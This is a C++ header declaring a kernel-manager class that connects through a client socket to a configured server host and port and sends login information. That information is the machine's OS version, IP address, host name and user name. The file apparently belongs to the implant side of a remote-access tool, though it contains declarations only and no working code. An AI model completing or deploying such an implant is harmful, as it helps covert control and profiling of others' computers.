// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#pragma once
#include "Manager.h"
#include "macros.h"


typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// version
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	wchar_t			HostName[50];	// HostName
	wchar_t	        UserName[50];	// UserName
}LOGININFO;

class CKernelManager : public CManager  
{
public:

	CKernelManager(CClientSocket *pClient,LPCTSTR lpszServerHost, UINT nServerPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	bool	IsActived();

	static TCHAR m_ServerHost[256];
	static UINT	m_ServerPort;
private:
	
	HANDLE	m_hThread[1000]; // 足够用了
	UINT	m_nThreadCount;
	bool	m_bIsActived;

public:
	int sendLoginInfo();
};